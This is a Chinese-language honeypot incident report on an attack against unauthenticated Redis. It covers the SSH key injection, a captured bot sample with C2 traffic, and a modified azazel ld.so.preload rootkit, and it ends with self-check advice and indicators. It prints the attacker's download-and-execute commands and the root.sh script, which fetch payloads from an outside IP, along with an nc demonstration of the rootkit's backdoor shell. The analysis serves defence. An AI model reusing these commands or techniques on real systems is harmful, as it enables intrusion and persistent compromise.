# Redis后门植入分析报告

**唐朝实验室蜜网项目组**

0x00 概述
=======

* * *

redis是一款基于内存与硬盘的高性能数据库，在国内外被大型互联网企业、机构等广泛采用。但其一些安全配置经验却不如“LAMP”等成熟，所以很多国内企业、机构的redis都存在简单的空口令、弱密码等安全风险。

11月10号，国外安全研究者的一份文档展示，redis在未进行有效验证，并且服务器对外开启了SSH服务的前提下，攻击者有可能恶意登录服务器甚至进行提权操作（root权限）

通过与一些企业机构的沟通，已经发现了大量扫描与自动化攻击痕迹。

唐朝实验室蜜网项目组于11月10号的晚上对蜜罐系统进行了更新，加入了redis服务，经过一个晚上的观测，我们捕获到了一次针对redis的扫描以及攻击，包括攻击者使用的远控。

我们的蜜罐纪录显示攻击者通过蜜罐中redis的漏洞进行攻击，进行远程控制程序的植入。

0x01 时间流
========

* * *

11月10号 晚上11点多我们的蜜罐系统检测一个美国ip到对redis服务的扫描

```
Nov 10 23:07:51 redis[23]: Accepted 104.219.234.226:20572
Nov 10 23:58:26 redis[23]: Accepted 104.219.234.226:4460
Nov 10 23:58:30 redis[23]: Accepted 104.219.234.226:4493
Nov 10 23:58:33 redis[23]: Accepted 104.219.234.226:4797
Nov 10 23:58:36 redis[23]: Accepted 104.219.234.226:5108
Nov 10 23:58:41 redis[23]: Accepted 104.219.234.226:5424

```

攻击者在登入redis后写入了public key

```
1.1.1.1:6379> get crackit
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcuHEVMRqY/Co/RJ5o5RTZmpl6sZ7U6w39WAvM7Scl7nGvr5mS4MRRIDaoAZpw7sPjmBHz2HwvAPYGCekcIVk8Xzc3p31v79fWeLXXyxts0jFZ8YZhYMZiugOgCKvRIs63DFf1gFoM/OHUyDHosi8E6BOi7ANqupScN8cIxDGsXMFr4EbQn4DoFeRTKLg5fHL9qGamaXXZRECkWHmjFYUZGjgeAiSYdZR49X36jQ6nuFBM18cEZe5ZkxbbtubnbAOMrB52tQX4RrOqmuWVE/Z0uCOBlbbG+9sKyY9wyp/aHLnRiyC8GBvbrZqQmyn9Yu1zBp3tY8Tt6DWmo6BLZV4/ crack@redis.io\n\n\n\n”

```

之后查看了key

```
cat authorized_keys
REDIS0006�0xcafe0b3c6eu30x1447215705654crackitA�

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcuHEVMRqY/Co/RJ5o5RTZmpl6sZ7U6w39WAvM7Scl7nGvr5mS4MRRIDaoAZpw7sPjmBHz2HwvAPYGCekcIVk8Xzc3p31v79fWeLXXyxts0jFZ8YZhYMZiugOgCKvRIs63DFf1gFoM/OHUyDHosi8E6BOi7ANqupScN8cIxDGsXMFr4EbQn4DoFeRTKLg5fHL9qGamaXXZRECkWHmjFYUZGjgeAiSYdZR49X36jQ6nuFBM18cEZe5ZkxbbtubnbAOMrB52tQX4RrOqmuWVE/Z0uCOBlbbG+9sKyY9wyp/aHLnRiyC8GBvbrZqQmyn9Yu1zBp3tY8Tt6DWmo6BLZV4/ crack@redis.io

```

于11点58分ip`104.219.234.226`登陆了系统并执行了以下命令

```
curl http://85.118.98.197:61050/cyka/blyat/x.x86 > /tmp/ok; wget http://85.118.98.197:61050/cyka/blyat/x.x86 -O /tmp/ok; chmod 777 /tmp/ok; /tmp/ok

```

该命令通过一个格鲁吉亚的ip`85.118.98.197`下载了样本x.x86 写入`/tmp/ok`并执行

样本x.x86细节见 0x02

于11号早上10点10分 攻击者通过远程控制程序在 http://85.118.98.197:61050/root.sh 下载了root.sh脚本并执行

```
#!/bin/sh

mkdir /tmp/ok/;
cd /tmp/ok/
curl http://85.118.98.197:61050/k.tgz > /tmp/ok/k.tgz
wget http://85.118.98.197:61050/k.tgz -O /tmp/ok/k.tgz

tar -xzvf k.tgz
bash vishnu.sh

curl http://85.118.98.197:61050/done.txt > /dev/null
wget http://85.118.98.197:61050/done.txt -O /dev/null

```

0x02 样本分析
=========

* * *

**x.x86样本分析**

样本大小仅有23k，未经加壳保护，功能多样，并没有很严格的自我保护，初步推断起用途只是初步筛选存在漏洞的主机，同时为下一步植入rootkit做准备。

样本首先遍历文件句柄，执行close操作，确保接下来可以成功删除自身。

![enter image description here](http://drops.javaweb.org/uploads/images/6fd27964277c9681d24f9ca2bec2b32c470a52ca.jpg)

紧接着进行两次fork，避免出现意外而成为僵尸进程。 完成fork后紧接着调用unlink删除自身。

![enter image description here](http://drops.javaweb.org/uploads/images/fa0c5ba8f3ebfa1134e041334b00b28de336725d.jpg)

执行完以上的初始化任务后，样本会尝试连接`8.8.8.8`的53端口验证网络是否通畅。如果可以连接，紧接着会与`37.220.109.6`的53端口建立tcp连接，开始与c2服务器互发心跳包，等待服务器指令。

其中c2服务器IP为硬编码：

![enter image description here](http://drops.javaweb.org/uploads/images/e16e520e0c79431a6982b0ed943147a797addde6.jpg)

下图为心跳连接：

![enter image description here](http://drops.javaweb.org/uploads/images/c1e0ce8588e1217519ed0ce5a3246cd168dc52cd.jpg)

服务器会不定时主动下发指令，样本会依据收到的指令执行具体动作。

下图为其中一个服务器指令的数据包：

![enter image description here](http://drops.javaweb.org/uploads/images/e7b396f970f95bd0febc8fc60cb0f0d62c1b9721.jpg)

样本收到指令后的行为如下：

![enter image description here](http://drops.javaweb.org/uploads/images/8397721ce22b71232ebf9d97259e49c5c27e94f6.jpg)

解析指令：

![enter image description here](http://drops.javaweb.org/uploads/images/2ed78a627f94b5c40edf3183da6a5afe64d6dd99.jpg)

指令解析完成后会执行对应的函数，当任务完成后会返回至`loc_8049FB6`，等待开始新一轮指令到来。

![enter image description here](http://drops.javaweb.org/uploads/images/2a19d6df4be8d7e0b8f65864b4440f65983ed22a.jpg)

在本次利用过程中，此样本短小精悍，被用作"破门"工具。在利用redis漏洞进入主机后，留下一个仅23k的木马，反弹回主控服务器，服务器再统一下发指令，完成对目标的进一步入侵。

_k.tgz_

本次活动中，此样本下载了远端服务器的一套完整rootkit级后门源码，试图安装在主机中。

rootkit来源于github开源项目`https://github.com/chokepoint/azazel`，经过修改加强后植入主机。

本次活动中的rootkit是用户态的rootkit，并没有生成内核模组。但由于hook了绝大多数系统调用，被种上后门之后极其难以发现和清除。

rootkit通过写入`/etc/ld.so.preload`文件获得优先加载权，覆盖其希望hook的系统调用，导致所有使用动态链接的程序中使用的关键系统调用均被替换，几乎无法对rootkit进行有效的检测和清除工作。其hook之全甚至包括了pcap，所以本机抓包也是发现不了rootkit的。 大量的hook：

![enter image description here](http://drops.javaweb.org/uploads/images/6f3edbb83edb345ae50789d7a12d8e3e6b54ed6f.jpg)

pcap的HOOK：

![enter image description here](http://drops.javaweb.org/uploads/images/388b7217eab7844f4171fb5565842d689771b3d7.jpg)

非常有趣的是，这个rootkit还使用了一种有趣的后门开shell的方案，在代码中可以直接通过hook系统的accept函数，当触发到预先定义好的条件时将会调用drop_shell函数来弹出一个shell。 而这个shell使用的端口恰恰在rootkit所隐藏的区间内。

![enter image description here](http://drops.javaweb.org/uploads/images/1444e2fab6b06cd37b201e8a5fab1ae81ef0e6fd.jpg)

随便在无加密shell端口区间内开一个端口（用nc模拟一下）

```
nc -l -p 61041

```

然后用61042去连接这个61041端口，输入预先设置的口令

```
alkaid@alkaid-VirtualBox:~/azazel/python-pty-shells$ nc 127.0.0.1 61041 -p 61042changeme
Welcome!
Here's a shell: root@alkaid-VirtualBox:/home/alkaid/azazel/python-pty-shells#

```

也就是说直接在任意端口上开了个后门，如果使用的端口号位于azazel 隐藏区间，还可以避免被发现。

当然也有加密方式的端口后门和区间，有兴趣可以去试一下azazel官方文档上socat的连接方式。

本次活动中截获的样本，本质上是使用azazel开源项目隐藏自己的后门。但不得不说的是，这个后门作者非常聪明地将自己的后门和azazel项目紧密结合起来，由一个巧妙但并不难发现的后门一跃而成为了rootkit级别的高危恶意软件。在这次活动中我们还发现了比较不同寻常的一点，以往的恶意软件部署绝大多数都是采用脚本或根据平台直接部署二进制文件，而自一次，攻击者却使用第一次打入的远程控制软件下载了rootkit的全套源码，在受害主机上完成整个编译安装的过程。同时攻击者似乎对肉鸡有些洁癖，在源码中我们发现一个名为“kill-other”的脚本 ，其作用是清除其他入侵者留下的木马，确保肉鸡的唯一控制权。

0x03 redis自查建议
==============

* * *

请企业近期额外注意redis服务器的异常。自查方法：查看redis服务的认证机制，是否无认证或弱口令；同时检查redis服务roor的.ssh目录下是否出现非法的KEY

0x04 附录
=======

* * *

**样本md5**

x.x86 9101e2250acfa8a53066c5fcb06f9848

k.tgz bd3ac812281c0d9a378383dd934a6013

**ip**

104.219.234.226

85.118.98.197

37.220.109.6